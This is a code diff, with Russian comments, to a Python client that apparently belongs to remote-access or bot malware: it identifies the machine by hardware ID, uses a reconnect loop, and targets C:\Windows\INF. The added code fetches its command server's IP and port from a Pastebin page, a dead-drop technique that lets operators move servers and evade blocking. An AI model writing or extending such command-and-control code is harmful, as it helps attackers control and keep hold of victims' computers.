@@ -73,9 +73,53 @@ CLIENT_ID = f"{device_name}/{get_hwid()}"
 logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
 # ====== Настройки подключения ======
-SERVER_IP = "#!"
-SERVER_PORT = #type
+PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxxxyyyy"  # ЗАменить
+
+def get_server_config():
+    
+    """
+    Скачивает конфигурацию сервера с Pastebin.
+    Ожидаемый формат на Pastebin (сырой текст):
+    {
+        "ip": "123.45.67.89",
+        "port": 9876
+    }
+    """
+
+    for attempt in range(5):
+        try:
+            logger.info(f"Попытка {attempt + 1}/5 получить конфигурацию с Pastebin...")
+            response = requests.get(PASTEBIN_RAW_URL, timeout=10)
+            response.raise_for_status()
+            data = response.json()  # Ожидаем валидный JSON
+
+            ip = data.get("ip", "").strip()
+            port = data.get("port")
+
+            if not ip or not isinstance(port, int) or port < 1 or port > 65535:
+                raise ValueError("Некорректные данные в JSON")
+
+            logger.info(f"Успешно получена конфигурация: {ip}:{port}")
+            return ip, port
+
+        except requests.RequestException as e:
+            logger.error(f"Ошибка сети при загрузке конфигурации (попытка {attempt + 1}): {e}")
+        except json.JSONDecodeError:
+            logger.error("Pastebin содержит невалидный JSON")
+        except Exception as e:
+            logger.error(f"Ошибка парсинга конфигурации: {e}")
+
+        if attempt < 4:
+            time.sleep(3)
+
+    # Если всё плохо — выходим, чтобы не подключаться к старым/неизвестным адресам
+    logger.critical("Не удалось получить IP/Port с Pastebin. Завершение работы.")
+    sys.exit(1)
+
+# Загружаем конфигурацию при старте
+SERVER_IP, SERVER_PORT = get_server_config()
 RECONNECT_DELAY = 5
+
 # ====== Глобальные переменные ======
 CURRENT_VERSION = 17
 TARGET_DIR = r"C:\Windows\INF"
